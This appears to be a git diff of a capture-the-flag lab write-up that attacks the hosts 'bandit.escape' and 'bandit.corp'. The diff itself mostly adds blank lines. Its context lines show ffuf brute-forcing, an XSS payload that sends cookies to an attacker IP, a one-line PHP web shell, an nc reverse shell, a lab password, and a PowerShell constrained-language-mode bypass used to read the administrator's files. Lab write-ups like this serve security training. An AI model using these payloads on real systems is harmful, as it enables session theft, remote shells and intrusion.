@@ -34,6 +34,7 @@ nmap 10.200.114.104 -A
 ![image4](../resources/a8f950d52f60456084d9f0d492aabe45.png)
 
 - NMAP the windows host:
+
 ```bash
 nmap 10.200.114.10 -p- -A -Pn
 
@@ -48,6 +49,7 @@ Add bandit.escape to /etc/hosts
 ![image6](../resources/0b530bc13d6641d9aab6236c48d1eb32.png)
 
 - Directory bruteforce:
+
 ```bash
 ffuf -u http://bandit.escape/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fw 428
 
@@ -56,6 +58,7 @@ ffuf -u http://bandit.escape/FUZZ -w /usr/share/wordlists/dirbuster/directory-li
 ![image7](../resources/9d68b40810ef40909e884b805111e48e.png)
 
 - Since we know there's a login.php, we can bruteforce for php extensions as well
+
 ```bash
 ffuf -u http://bandit.escape/FUZZ.php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fw 428
 
@@ -64,6 +67,7 @@ ffuf -u http://bandit.escape/FUZZ.php -w /usr/share/wordlists/dirbuster/director
 ![image8](../resources/b1d93fe1b2094078bbcbaea68aa02312.png)
 
 - This page is also vulnerable to XSS
+
 ```bash
 "<script><script>alert('XSS');</script>
 
@@ -72,6 +76,7 @@ ffuf -u http://bandit.escape/FUZZ.php -w /usr/share/wordlists/dirbuster/director
 ![image9](../resources/70ffbfa3650948578c54e0475afc307b.png)
 
 - Let's try and get a cookie with this one:
+
 ```bash
 "<script><script>alert(document.cookie)</script>
 
@@ -140,6 +145,7 @@ Turn **OFF** Update Content-Length:
 - Go through the process again (from point 4.)
 
 - Use the payload (and URL encode it first):
+
 ```bash
 "<script><script>fetch("http://10.50.111.248:8082//"+document.cookie)</script>
 
@@ -229,7 +235,8 @@ which can then affect other clients accessing the server's responses
 
 - Give a new filename with a .php extension and see if it works
 
-- Also add some php code - the shortest php exploit code available
+- Also add some php code - the shortest php exploit code available:
+
 ```bash
 <?=`$_GET[0]`?>
 
@@ -275,6 +282,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.50.111.248 4445 >/tmp/f
 
 ```
 - Set up nc listener:
+
 ```bash
 rlwrap -cAr nc -lvnp 4445
 
@@ -328,6 +336,7 @@ cat flag.txt
 WSMan - Windows Remote Management
 
 - Recursively try and find anything Windows related:
+
 ```bash
 grep --color=auto -irnw / -e "powershell" 2>/dev/null
 
@@ -344,6 +353,7 @@ grep --color=auto -irnw / -e "pssession" 2>/dev/null
 **safeuserHelpDesk : Passw0rd**
 
 - Run:
+
 ```bash
 pwsh
 ```
@@ -371,6 +381,7 @@ Enter-PSSession -ComputerName bandit.corp `
 **<u>Bypass powershell constrained language mode:</u>**
 
 - See what commands we have:
+
 ```bash
 Get-Command
 
@@ -396,6 +407,7 @@ Get-Command
 - We can parse the single quote but not the double quote
 
 - Running whoami:
+
 ```bash
 Get-ServicesApplication -Filter '$(whoami)'
 
@@ -403,6 +415,7 @@ Get-ServicesApplication -Filter '$(whoami)'
 *winrm virtual users\winrm va_2_ec2amaz-a6s61fr_safeuserhelpdesk*
 
 - Find users:
+
 ```bash
 Get-ServicesApplication -Filter '$(dir C:\Users)'
 
@@ -411,6 +424,7 @@ Get-ServicesApplication -Filter '$(dir C:\Users)'
 ![image56](../resources/df48966e3dc3423e95f42477ab0bf518.png)
 
 - Look on Administrators Desktop:
+
 ```bash
 Get-ServicesApplication -Filter '$(dir C:\Users\Administrator\Desktop)'
 
@@ -419,6 +433,7 @@ Get-ServicesApplication -Filter '$(dir C:\Users\Administrator\Desktop)'
 ![image57](../resources/a657023a7e6b47b1978c6347948c1554.png)
 
 - Read root.txt
+
 ```bash
 Get-ServicesApplication -Filter '$(type C:\Users\Administrator\Desktop\root.txt)'
 
